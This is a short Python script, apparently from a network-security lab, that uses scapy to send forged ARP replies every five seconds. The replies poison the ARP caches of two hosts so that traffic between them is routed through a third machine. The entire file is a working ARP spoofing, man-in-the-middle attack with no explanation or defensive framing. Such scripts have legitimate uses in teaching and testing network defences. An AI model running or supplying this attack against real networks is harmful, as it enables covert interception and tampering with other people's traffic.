#!/usr/bin/env python3
hostAIP = '10.9.0.5'
hostBIP = '10.9.0.6'
hostrMIP = '10.9.0.105'

blancMAC = 'ff:ff:ff:ff:ff:ff'
hostAMAC = '02:42:0a:09:00:05'
hostBMAC = '02:42:0a:09:00:06'
hostMMAC = '02:42:0a:09:00:69'

SEND = 1
REPLY = 2
INTERVAL = 5

from scapy.all import * 
import time

while ( True ):
    ##############
    E = Ether(dst=blancMAC, src=hostMMAC)
    A = ARP(op=REPLY, hwsrc=hostMMAC, psrc=hostBIP, pdst=hostAIP)

    pkt = E/A
    ls(pkt)
    sendp(pkt)
    
    ##############
    E = Ether(dst=blancMAC, src=hostMMAC)
    A = ARP(op=REPLY, hwsrc=hostMMAC, psrc=hostAIP, pdst=hostBIP)

    pkt = E/A
    ls(pkt)
    sendp(pkt)

    time.sleep ( INTERVAL )